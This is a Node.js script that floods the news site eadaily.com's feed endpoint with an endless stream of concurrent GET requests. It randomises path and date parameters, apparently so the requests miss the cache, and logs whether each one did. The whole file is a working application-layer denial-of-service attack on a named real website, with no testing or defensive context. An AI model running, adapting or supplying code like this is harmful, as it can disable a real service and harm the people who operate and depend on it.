const http = require('https');

const paths = [
    "/ru/news/russia/",
    "/ru/news/belarus/",
    "/ru/news/ukraine/",
    "/ru/news/novorossia/",
    "/ru/news/europe/",
    "/ru/news/caucasus/",
    "/ru/news/east/",
    "/ru/news/asia/",
    "/ru/news/usa/",
    "/ru/news/latinamerica/",
    "/ru/news/other/",
    "/ru/news/politics/",
    "/ru/news/economics/",
    "/ru/news/society/",
    "/ru/news/energy/",
    "/ru/news/tech/",
    "/ru/news/accidents/",
    "/ru/news/ecology/",
    "/ru/news/transport/",
    "/ru/news/sport/",
    "/ru/news/analysis/",
    "/ru/news/history/",
    "/ru/news/military/",
    "/ru/news/analysis/",
    "/ru/poll/",
    "/ru/dossier/"
];

const base = 'https://eadaily.com/tools/get_news_feed.php'
const url = 'https://eadaily.com/tools/get_news_feed.php?path=/ru/news/ukraine/2022/02/25/&time=2022-02-25%2015:26:00'
const daysInFiveYears = 365 * 5;

function rand(max) {
    return Math.floor(Math.random() * max);
}

function getRandomPath() {
    return paths[rand(paths.length - 1)];
}

function getRandomDate() {
    const date = new Date();
    date.setDate(date.getDate() - rand(daysInFiveYears));
    
    return date;
}

function getRandomURL(resource) {
    const path = getRandomPath();
    const date = getRandomDate();
    const time = getRandomDate();

    const dateStr = `${date.getFullYear()}/${date.getMonth().toString().padStart(2, '0')}/${date.getDate().toString().padStart(2, '0')}`;
    const timeStr = `${time.getFullYear()}-${time.getMonth().toString().padStart(2, '0')}-${time.getDate().toString().padStart(2, '0')}%20${time.getHours().toString().padStart(2, '0')}:${time.getMinutes().toString().padStart(2, '0')}:00`;

    return `${resource.path}?path=${path}${dateStr}/&time=${timeStr}`;
}


var targets = [
    {
      hostname: 'eadaily.com',
      path: '/tools/get_news_feed.php'
    }
];

const getDurationInMilliseconds = (start) => {
    const NS_PER_SEC = 1e9
    const NS_TO_MS = 1e6
    const diff = process.hrtime(start)

    return (diff[0] * NS_PER_SEC + diff[1]) / NS_TO_MS
}

var CONCURRENCY_LIMIT = 10
var queue = []
//
async function fetchWithTimeout(resource) {
    return new Promise((resolve) => {
        const start = process.hrtime()

        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), 5000);
        const path = getRandomURL(resource);

        const options = {
            hostname: resource.hostname,
            path,
            port: 443,
            method: 'GET',
            signal: controller.signal
        }

        const result = { path: `${options.hostname}${path}` };

        const req = http.request(options, res => {
            result.statusCode = res.statusCode;
            result.cacheStatus = res.headers['x-cache-status'];
            clearTimeout(id);
            result.durationInMilliseconds = getDurationInMilliseconds (start)

            resolve(result);
        })

        req.on('error', error => {
            result.error = error.message;
            clearTimeout(id);
            result.durationInMilliseconds = getDurationInMilliseconds (start)

            resolve(result);
        })

        req.end()
    })
}
//
async function flood(target) {
    for (var i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        queue.push(
            fetchWithTimeout(target)
                .then((response) => {
                    console.log(response)
                })


        )
    }
}

targets.forEach((target) => {
    flood(target)
})
